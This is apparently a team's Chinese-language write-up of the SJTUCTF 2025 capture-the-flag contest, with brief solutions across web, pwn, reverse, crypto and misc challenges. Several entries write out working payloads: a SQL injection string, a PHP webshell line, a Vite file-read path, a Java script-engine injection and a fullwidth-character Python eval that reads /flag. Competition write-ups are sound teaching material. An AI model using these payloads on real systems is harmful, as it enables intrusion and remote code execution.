---
comment: true
---

# SJTUCTF 2025

!!! abstract

    上海交通大学第七届网络安全技术挑战赛。

    - 比赛链接：[SJTU CTF 2025](https://play.0ops.sjtu.cn/rules)
    - 比赛时间：2025 年 3 月 28 日 20:00 - 2025 年 4 月 6 日 20:00
    - 成绩：11580 分，总榜第二名，浙江大学第一名

## Web

### Push2Hint

HTTP2 Server Push 题目。使用 `nghttp -vny --hexdump` 获取服务器推送的 `push.gif` 资源，随后按提示逐步操作即可。

### 女娲补胎

```js
zhu_Rong.use(Zhu_Rong.static(Ying_Zhou.join(__dirname)));
```

存在任意文件读，访问 `/app.js` 获取密码，并修改 cookie `role=admin` 即可。

Flag: `0ops{x66ZTwpe5fbrJuD69SrAuA}`

### Emergency

Vite CVE-2025-30208 任意文件读，访问 `@fs/flag?import&raw??` 即可获取 flag。

### rickroll

> Caution: Using the PASSWORD_BCRYPT as the algorithm, will result in the password parameter being truncated to a maximum length of 72 bytes.
>
> <p style="text-align: right">—— <a href="https://www.php.net/manual/en/function.password-hash.php">PHP: Predefined Constants</a></p>

### EzWebAuthn

#### 非预期解

用户名处 SQL 注入，构造条件查询使注册时返回空、登录时返回 admin。

```
admin' AND '2' IN (SELECT user_id FROM credentials WHERE sign_count > 3) ORDER BY id LIMIT 1 --' ORDER BY id LIMIT 1
```

一个小问题是用户名太长了会导致 client 报错，需要 inspect 服务端第一次 response 的对应部分并修改之。

#### 预期解

SQL 注入获取 admin 的 `credential_id`。由于 `credential_id` 无唯一性约束，且 ORM 查询有一个奇怪的 `ordering by`，故可注册一个与 admin 相同 `credential_id` 但 `public_key` 字典序更小的用户，即可利用查询顺序差异实现越权。

### SmartGrader

Java ScriptEngine 字符串拼接注入。回显仅为布尔值（`A` / `N/A`），需布尔盲注。长度限制比较棘手，尝试了很久之后得出了一组 payload：

- 左边：`,'f'==java.lang.System/*`
- 右边：`*/.getenv('FLAG')[10])//`

### Gradient

CSS 字符串拼接导致 XSS。CSS Font Leak，为每个字符位置构造 `@font-face` 规则，通过 `unicode-range` 匹配字符并向自己的服务器发送请求，即可逐字符泄露 flag。

### realLibraryManager

黑盒审计。

图书查询处可 SQL 注入，得到管理员密码。管理员后台添加图书时可在简介中插入 `<?php system($_GET[0]); ?>`，备份数据库为 `.php` 文件执行即可获得 `webshell`。

## Pwn

### GuessMaster

Canary leak + ROP。

第一阶段使用 `ctypes` 调用本地 `libc` 通过 100 次猜随机数，注意真实 offset 并不是 10，需使用 gdb 动调才能得到真实值 110；

第二阶段溢出泄露 canary 后 ROP 到 `wish` 函数。

## Reverse

### AreYouReady

C# 程序，使用 ILSpy 反编译即可。

### NoisyCat

`encoder.exe` 生成无文件头的 WAV，使用 Bell 202 调制。

每字符 $(a_1 a_2 a_3 a_4 a_5 a_6 a_7 a_8)_2$ 会被编码为 $(1a_8 a_7 a_6 a_5 a_4 a_3 a_2 a_1 0)_2$。使用 `minimodem -f data.wav --binary-raw 10 --tx-carrier 1200` 解调后按逆向得到的逻辑处理即可。

### NoisyCat2

完全没有区别啊。

### SnakeSnakeSnake

CheatEngine 修改分数为 2025 后发现需输入 flag 以解锁 flag。

从 onefile 临时文件夹中获取 `check.pyd`，反编译发现 IPv6 Base85 字符串 `4mQWHMUK~Hxkx!J>1D@ZuS6TdSv#koy{vj+OgUd8`。

经过测试发现 `transform` 函数四字节一组处理且后组依赖前组结果，逐组爆破即可。

### ExprWarmup

输入三个后缀表达式表示 $a', b', c'$，要求与随机生成的 $a, b, c$ 满足特定关系。逆向得 $\mathbf{v_5} = (0, b^*, c^*)^T$ 且需满足 $\frac{b^*}{c^*} = \frac{b^2}{c^2}$，故 $b' = b^2, c' = c^2$ 为解。

## Crypto

### ezCrypt

Base64 + G-Zip + ASCII 得到两条消息。

Base64 + ROT13 解密第一条消息，获得第二条（IPv6 Base85）的提示。解码第二条得一组 RSA 密文与参数，FactorDB 可查询 $n$ 的因子分解，解密即可。

### Notes

SM3 使用 Merkle–Damgård 构造，可进行长度扩展攻击。原签名对 `secret.penguins.tomo0.GO` 签名，构造 `secret.penguins.tomo0.GO || padding || .CRYCRY` 即可使 `org` 字段为 `CRYCRY`。已知原签名和 secret 长度范围，爆破长度即可。

### AnatahEtodokuSakebi

AES Ciphertext Stealing。在整点 $\pm 10~\mathrm{s}$ 时请求才会返回 success 并输出 flag。

### KillerECC

elliptic 库 6.6.0 及以前版本存在漏洞：`msg = "a"` 和 `msg = "-a"` 可生成相同 nonce。利用 nonce 重用攻击恢复私钥。

## Misc

### Inaudible

从频谱图图像还原音频。使用 librosa 将图像转换为 mel 频谱，再使用 Griffin-Lim 算法重建音频信号即可。

### Welcom3

签到题。

### TIME & POWER

爆破密码为 `aaaaaaaaaadmin`，获得功耗分析数据（`.npz`）。对每个密码位，比较不同输入字符的功耗曲线，正确字符的曲线会在特定位置缺少峰值。

### IPHunter

使用机场节点得到 flag 1，使用测速网站与 TOR 得到 flag 2。

### PyCalc

利用 [PEP-672 标识符规范化特性](https://peps.python.org/pep-0672/#normalizing-identifiers)。使用全角字符构造绕过过滤，并拼接出 `open('/flag').read()` 执行。

```py
ｅｖａｌ(ｃｈｒ(111)+ｃｈｒ(112)+ｃｈｒ(101)+ｃｈｒ(110)+ｃｈｒ(40)+ｃｈｒ(39)+ｃｈｒ(47)+ｃｈｒ(102)+ｃｈｒ(108)+ｃｈｒ(97)+ｃｈｒ(103)+ｃｈｒ(39)+ｃｈｒ(41)+ｃｈｒ(46)+ｃｈｒ(114)+ｃｈｒ(101)+ｃｈｒ(97)+ｃｈｒ(100)+ｃｈｒ(40)+ｃｈｒ(41))
```
